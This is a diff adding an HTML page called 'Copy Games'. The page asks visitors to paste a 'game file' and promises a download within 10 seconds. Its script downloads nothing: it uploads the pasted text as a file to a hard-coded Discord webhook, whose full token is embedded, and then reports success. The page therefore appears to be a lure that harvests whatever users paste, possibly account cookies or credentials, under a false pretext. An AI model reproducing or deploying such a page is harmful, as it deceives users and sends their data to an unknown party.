@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Copy Games</title>
+  <style>
+    body {
+      background-color: black;
+      color: white;
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .container {
+      background-color: #111;
+      border: 2px solid #5765f2;
+      padding: 30px;
+      border-radius: 10px;
+      width: 400px;
+      text-align: center;
+    }
+
+    h1 {
+      color: #5765f2;
+      font-weight: bold;
+      margin-bottom: 15px;
+    }
+
+    p {
+      color: white;
+      margin-bottom: 20px;
+    }
+
+    input[type="text"] {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #444;
+      border-radius: 5px;
+      background-color: #222;
+      color: white;
+      margin-bottom: 20px;
+    }
+
+    input::placeholder {
+      color: white;
+    }
+
+    button {
+      background-color: #5765f2;
+      color: white;
+      font-weight: bold;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 25px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+
+    button:hover {
+      opacity: 0.9;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Copy Games</h1>
+    <p>Paste your game file in the box below, then click "Copy Game!" Your game should download within 10 seconds.</p>
+    <input type="text" id="gameFile" placeholder="Enter Game File" />
+    <button onclick="sendToDiscord()">Copy Game!</button>
+  </div>
+
+  <script>
+    function sendToDiscord() {
+      const gameFile = document.getElementById('gameFile').value.trim();
+      if (!gameFile) {
+        alert("Please enter a game file.");
+        return;
+      }
+
+      const webhookURL = "https://discord.com/api/webhooks/1397961913543163914/mCUh7tbuB4KzYyzRtFTmKiVMfw4sAJJTsFp945A0FA9qbrbG3XvCQdvtTzGICay92rnu";
+
+      // Convert input into a text file blob
+      const file = new Blob([gameFile], { type: 'text/plain' });
+      const formData = new FormData();
+      formData.append("file", file, "gameFile.txt");
+      formData.append("content", "📎 New game file uploaded:");
+
+      fetch(webhookURL, {
+        method: "POST",
+        body: formData
+      })
+      .then(response => {
+        if (response.ok) {
+          alert("Game file sent successfully!");
+          document.getElementById('gameFile').value = "";
+        } else {
+          alert("Failed to send game file.");
+        }
+      })
+      .catch(error => {
+        console.error("Error sending to Discord:", error);
+        alert("Error sending to Discord.");
+      });
+    }
+  </script>
+</body>
+</html>
